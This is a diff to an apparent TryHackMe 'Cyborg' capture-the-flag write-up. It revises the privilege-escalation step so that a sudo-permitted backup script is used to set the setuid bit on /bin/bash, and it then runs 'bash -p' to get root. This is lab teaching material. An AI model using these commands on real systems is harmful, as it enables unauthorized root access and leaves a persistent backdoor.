@@ -233,12 +233,14 @@ So we can see that the script is taking arguments through "c" flag , hence I tir
 Since it worked I tried
 
 
-> sudo /etc/mp3backups/backup.sh -c "bash -p"
+> sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
 
+
+> /bin/bash -p
 
 And got root.
 
 
-![](/TryHackMe/Cyborg/root.png)
+
 
 
